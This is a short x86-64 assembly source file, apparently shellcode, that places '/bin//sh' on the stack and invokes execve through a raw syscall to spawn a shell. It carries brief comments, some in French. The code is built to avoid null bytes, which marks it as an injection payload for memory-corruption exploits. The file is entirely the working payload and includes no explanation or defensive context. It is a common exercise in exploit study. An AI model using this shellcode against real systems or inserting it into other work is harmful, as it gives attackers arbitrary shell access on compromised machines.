bits 64

section .text
    global _start
_start:
    xor rax, rax
    push rax            ; NULL terminator envp

    mov rdx, rsp        ; rdx = envp

    push rax            ; NULL terminator argv
    mov rdi, 0x68732f2f6e69622f     ; "/bin//sh"
    push rdi
    mov rdi, rsp        ; rdi = ptr vers "/bin//sh"

    push rax            ; NULL
    push rdi            ; ptr "/bin//sh"
    mov rsi, rsp        ; rsi = argv ["/bin//sh", NULL]

    mov al, 59          ; execve
    syscall